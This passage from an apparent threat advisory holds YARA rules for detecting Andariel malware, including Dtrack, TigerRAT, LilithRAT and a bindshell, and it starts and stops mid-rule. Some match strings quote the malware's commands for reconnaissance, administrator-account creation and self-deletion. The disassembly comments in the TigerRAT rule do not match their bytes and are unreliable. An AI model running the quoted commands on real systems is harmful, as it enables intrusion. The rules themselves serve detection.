wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_comp_orcl = \"company/oracle\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $POST_field_1 = \"session=\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $POST_field_2 = \"type=\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $POST_field_3 = \"id=\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $command_misspelled = \"renmae\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; condition:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint16(0) == 0x5a4d and 7 of them</td>
</tr>
<tr>
<td>rule Andariel_hhsd_FileTransferTool<br>{<br><br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; // 30 4D C7&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor&nbsp; &nbsp; &nbsp;[rbp+buffer_v41+3], cl<br>&nbsp; &nbsp; &nbsp; &nbsp; // 81 7D C4 22 C0 78 00&nbsp; &nbsp; cmp&nbsp; &nbsp; &nbsp; dword ptr [rbp+buffer_v41], 78C022h<br>&nbsp; &nbsp; &nbsp; &nbsp; // 44 88 83 00 01 00 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbx+100h], r8b<br>&nbsp; &nbsp; &nbsp; &nbsp; $handshake = { 30 ?? ?? 81 7? ?? 22 C0 78 00 4? 88 }<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; // B1 14&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov&nbsp; &nbsp; &nbsp;cl, 14h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 F7 14 00 41 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+Src], 410014h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 FB 7A 00 7F 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_5C], 7F007Ah<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 FF 7B 00 63 00&nbsp; &nbsp; mov &nbsp; &nbsp; [rbp+57h+var_58], 63007Bh<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 03 7A 00 34 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_54], 34007Ah<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 07 51 00 66 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_50], 660051h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 0B 66 00 7B 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_4C], 7B0066h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 0F 66 00 00 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_48], 66h ; 'f'<br>&nbsp; &nbsp; &nbsp; &nbsp; $err_xor_str = { 14 C7 [2] 14 00 41 00 C7 [2] 7A 00 7F 00 C7 [2] 7B 00 63 00 C7 [2] 7A 00 34 00 }<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; // 41 02 D0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add&nbsp; &nbsp; &nbsp;dl, r8b<br>&nbsp; &nbsp; &nbsp; &nbsp; // 44 02 DA&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add&nbsp; &nbsp; &nbsp;r11b, dl<br>&nbsp; &nbsp; &nbsp; &nbsp; // 3C 1F&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cmp&nbsp; &nbsp; &nbsp;al, 1Fh<br>&nbsp; &nbsp; &nbsp; &nbsp; $buf_add_cmp_1f = { 4? 02 ?? 4? 02 ?? 3? 1F }</td>
</tr>
<tr>
<td>&nbsp; &nbsp; &nbsp; &nbsp; // B9 8D 10 B7 F8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp;ecx, 0F8B7108Dh<br>&nbsp; &nbsp; &nbsp; &nbsp; // E8 F1 BA FF FF&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; sub_140001280<br>&nbsp; &nbsp; &nbsp; &nbsp; $hash_call_loadlib = { B? 8D 10 B7 F8 E8 }<br>&nbsp; &nbsp; &nbsp; &nbsp; $hash_call_unk = { B? 91 B8 F6 88 E8 }<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and<br>&nbsp; &nbsp; &nbsp; &nbsp; (any of ($handshake, $err_xor_str, $buf_add_cmp_1f) and any of ($hash_call_*)) or<br>&nbsp; &nbsp; &nbsp; &nbsp; 2 of ($handshake, $err_xor_str, $buf_add_cmp_1f)</td>
</tr>
<tr>
<td>rule Andariel_Atharvan_3RAT<br>{<br>strings:<br>$3RAT = \"D:\\\\rang\\\\TOOL\\\\3RAT\"&nbsp;<br>$atharvan = \"Atharvan_dll.pdb\"<br>condition:<br>uint16(0) == 0x5a4d and any of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_LilithRAT_Variant<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; // The following are strings seen in the open source version of Lilith<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_1 = \"Initiate a CMD session first.\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_2 = \"CMD is not open\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_3 = \"Couldn't write command\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_4 = \"Couldn't write to CMD: CMD not open\" ascii wide<br><br>&nbsp; &nbsp; &nbsp; &nbsp; // The following are strings that appear to be unique to the Unnamed Trojan based on Lilith<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_1 = \"Upload Error!\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_2 = \"ERROR: Downloading is already running!\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_3 = \"ERROR: Unable to open file:\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_4 = \"General error\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_5 = \"CMD error\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_6 = \"killing self\" ascii wide<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and filesize &lt; 150KB and all of ($lilith_*) and 2 of ($unique_*)<br>}</td>
</tr>
<tr>
<td>rule Andariel_SocksTroy_Strings_OpCodes<br>{<br>&nbsp; &nbsp; &nbsp; &nbsp;strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $strHost = \"-host\" wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $strAuth = \"-auth\" wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $SocksTroy = \"SocksTroy\"&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; $cOpCodeCheck = { 81 E? A0 00 00 00 0F 84 ?? ?? ?? ?? 83 E? 03 74 ?? 83 E? 02 74 ?? 83 F? 0B }<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and<br>&nbsp; &nbsp; &nbsp; &nbsp; ((1 of ($str*)) and&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; (all of ($c*)) or (all of ($Socks*)))<br>}</td>
</tr>
<tr>
<td>rule Andariel_Agni<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $xor = { 34 ?? 88 01 48 8D 49 01 0F B6 01 84 C0 75 F1 }<br>&nbsp; &nbsp; &nbsp; &nbsp; $stackstrings = {C7 44 24 [5-10] C7 44 24 [5] C7 44 24 [5-10] C7 44 24 [5-10] C7 44 24}<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and (#xor &gt; 100 and #stackstrings &gt; 5)<br>}</td>
</tr>
<tr>
<td>rule Andariel_GoLang_validalpha_handshake<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = { 66 C7 00 AB CD C6 40 02 EF ?? 03 00 00 00 48 89 C1 ?? 03 00 00 00 }<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_GoLang_validalpha_tasks<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.ScreenMonitThread\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.CmdShell\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.GetAllFoldersAndFiles\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.SelfDelete\"<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_GoLang_validalpha_BlackString<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; $ = \"I:/01___Tools/02__RAT/Black\"<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; uint16(0) == 0x5A4D and all of them<br>}</td>
</tr>
<tr>
<td>rule INDICATOR_EXE_Packed_VMProtect {<br>&nbsp; &nbsp; &nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $s1 = \".vmp0\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s2 = \".vmp1\" fullword ascii<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and all of them or<br>&nbsp; &nbsp; &nbsp; &nbsp; for any i in (0 .. pe.number_of_sections) : (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pe.sections[i].name == \".vmp0\" or<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pe.sections[i].name == \".vmp1\"<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )<br>&nbsp; &nbsp; &nbsp; &nbsp; )<br>}</td>
</tr>
<tr>
<td>rule INDICATOR_EXE_Packed_Themida {<br>&nbsp; &nbsp; &nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $s1 = \".themida\" fullword ascii<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and all of them or<br>&nbsp; &nbsp; &nbsp; &nbsp; for any i in (0 .. pe.number_of_sections) : (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pe.sections[i].name == \".themida\"<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )<br>&nbsp; &nbsp; &nbsp; &nbsp; )<br>}</td>
</tr>
<tr>
<td>rule Andariel_elf_backdoor_fipps<br>{<br>strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $a = \"found mac address\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $b = \"RecvThread\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $c = \"OpenSSL-1.0.0-fipps\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $d = \"Disconnected!\"<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; (all of them) and uint32(0) == 0x464c457f<br>}</td>
</tr>
<tr>
<td>rule Andariel_bindshell<br>{<br>strings:<br>&nbsp;$str_comspec = \"COMSPEC\"<br>&nbsp;$str_consolewindow = \"GetConsoleWindow\"<br>&nbsp;$str_ShowWindow = \"ShowWindow\"<br>&nbsp;$str_WSASocketA = \"WSASocketA\"<br>&nbsp;$str_CreateProcessA = \"CreateProcessA\"<br>&nbsp;$str_port = {B9 4D 05 00 00 89}<br>condition:<br>uint16(0) == 0x5A4D and all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_grease2<br>{<br>strings:<br>&nbsp;$str_rdpconf = \"c: \\\\windows\\\\temp\\\\RDPConf.exe\" fullword nocase<br>&nbsp;$str_rdpwinst = \"c: \\\\windows\\\\temp\\\\RDPWInst.exe\" fullword nocase<br>&nbsp;$str_net_user = \"net user\"<br>&nbsp;$str_admins_add = \"net localgroup administrators\"<br>condition:<br>uint16(0) == 0x5A4D and<br>all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_NoPineapple_Dtrack_unpacked<br>{<br>strings:<br>&nbsp;$str_nopineapple = \"&lt; No Pineapple! &gt;\"<br>&nbsp;$str_qt_library = \"Qt 5.12.10\"<br>&nbsp;$str_xor = {8B 10 83 F6 ?? 83 FA 01 77}<br>condition:<br>uint16(0) == 0x5A4D and<br>all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_dtrack_unpacked<br>{<br>strings:<br>&nbsp;$str_mutex = \"MTX_Global\"<br>&nbsp;$str_cmd_1 = \"/c net use \\\\\\\\\" wide<br>&nbsp;$str_cmd_2 = \"/c ping -n 3 127.0.01 &gt; NUL % echo EEE &gt; \\\"%s\\\"\" wide<br>&nbsp;$str_cmd_3 = \"/c move /y %s \\\\\\\\\" wide<br>&nbsp;$str_cmd_4 = \"/c systeminfo &gt; \\\"%s\\\" &amp; tasklist &gt; \\\"%s\\\" &amp; netstat -naop tcp &gt; \\\"%s\\\"\" wide<br>condition:<br>uint16(0) == 0x5A4D and<br>all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_TigerRAT_crowdsourced_rule {<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $m1 = \".?AVModuleKeyLogger@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $m2 = \".?AVModulePortForwarder@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $m3 = \".?AVModuleScreenCapture@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $m4 = \".?AVModuleShell@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s1 = \"\\\\x9891-009942-xnopcopie.dat\" fullword wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $s2 = \"(%02d : %02d-%02d %02d:%02d:%02d)--- %s[Clipboard]\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s3 = \"[%02d : %02d-%02d %02d:%02d:%02d]--- %s[Title]\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s4 = \"del \\\"%s\\\"%s \\\"%s\\\" goto \" ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s5 = \"[&lt;&lt;]\" fullword ascii<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and (all of ($s*) or (all of ($m*) and 1 of ($s*)) or (2 of ($m*) and 2 of ($s*)))<br>}</td>
</tr>
<tr>
<td>rule win_tiger_rat_auto {<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_0 = { 33c0 89442438 89442430 448bcf 4533c0 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; 5<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;89442438&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;89442430&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;448bcf&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, byte ptr [eax]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4533c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_1 = { 41b901000000 488bd6 488bcb e8???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;41b901000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bd6&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bcb&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_2 = { 4881ec90050000 8b01 8985c8040000 8b4104 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4881ec90050000&nbsp; &nbsp; &nbsp; &nbsp;| test&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jns&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x16<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8985c8040000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4104&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_3 = { 488b01 ff10 488b4f08 4c8d4c2430 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, esi<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b4f08&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, ebx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4c8d4c2430&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_4 = { 488b01 ff10 488b4e18 488b01 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ecx + 0x18], 0x10<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b4e18&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| sub&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x590<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_5 = { 4881eca0000000 33c0 488bd9 488d4c2432 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4881eca0000000&nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dword ptr [ebp + 0x4c8], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bd9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ecx + 4]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488d4c2432&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp + 0x4d0], eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_6 = { 488b01 eb03 488bc1 0fb600 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;eb03&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ebx, dword ptr [ebp + ebp]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488bc1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| inc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb600&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movups&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xmmword ptr [edi], xmm0<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_7 = { 488b01 8b10 895124 448b4124 4585c0 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;488b01&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| sub&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x30<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;895124&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 